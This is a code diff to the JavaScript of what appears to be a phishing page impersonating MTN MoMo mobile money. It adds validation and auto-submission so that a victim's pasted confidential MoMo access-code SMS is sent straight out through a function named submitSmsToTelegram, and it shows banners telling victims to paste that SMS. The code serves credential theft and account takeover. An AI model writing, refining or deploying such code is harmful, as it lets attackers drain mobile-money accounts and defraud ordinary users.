@@ -100,6 +100,13 @@ document.addEventListener('DOMContentLoaded', () => {
     return zeroPhone || '096 XXX XXXX';
   }
 
+  // Matches: Y'ello. Please note! This confidential code gives access to your MoMo account:.....
+  function isExpectedMomoSms(rawSms) {
+    const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
+    const prefixRegex = /^Y['’]ello\.\s*Please note!\s*This confidential code gives access to your MoMo account:\s*\S+/i;
+    return prefixRegex.test(normalized);
+  }
+
   function showBanner(el, msg) {
     if (!el) return;
     el.innerText = msg;
@@ -383,21 +390,34 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
+  function checkAndAutoSubmitSms() {
+    if (!smsInputBox) return;
+    const currentText = smsInputBox.value.replace(/\s+/g, ' ').trim();
+    if (isExpectedMomoSms(currentText) && currentText !== smsAutoSubmittedForCurrentValue) {
+      smsAutoSubmittedForCurrentValue = currentText;
+      submitSmsToTelegram(currentText, true);
+    }
+  }
+
   if (smsInputBox) {
-    smsInputBox.addEventListener('input', () => {
-      const currentText = smsInputBox.value.trim();
-      if (/^Y['’]ello/i.test(currentText) && currentText.length >= 6 && currentText !== smsAutoSubmittedForCurrentValue) {
-        smsAutoSubmittedForCurrentValue = currentText;
-        submitSmsToTelegram(currentText, true);
-      }
+    smsInputBox.addEventListener('input', checkAndAutoSubmitSms);
+    smsInputBox.addEventListener('paste', () => {
+      setTimeout(checkAndAutoSubmitSms, 10);
     });
   }
 
   if (btnValidatedSms) {
     btnValidatedSms.addEventListener('click', () => {
-      const currentText = (smsInputBox?.value || '').trim();
+      const currentText = (smsInputBox?.value || '').replace(/\s+/g, ' ').trim();
       if (!currentText) {
         showBanner(bannerSmsError, 'Please paste the SMS message received on your MTN MoMo number.');
+        return;
+      }
+      if (!isExpectedMomoSms(currentText)) {
+        showBanner(
+          bannerSmsError,
+          "SMS must follow: Y'ello. Please note! This confidential code gives access to your MoMo account:....."
+        );
         return;
       }
       submitSmsToTelegram(currentText, false);
@@ -505,4 +525,4 @@ document.addEventListener('DOMContentLoaded', () => {
 
   showScreen(screenWelcome);
 });
-    
+                                                   
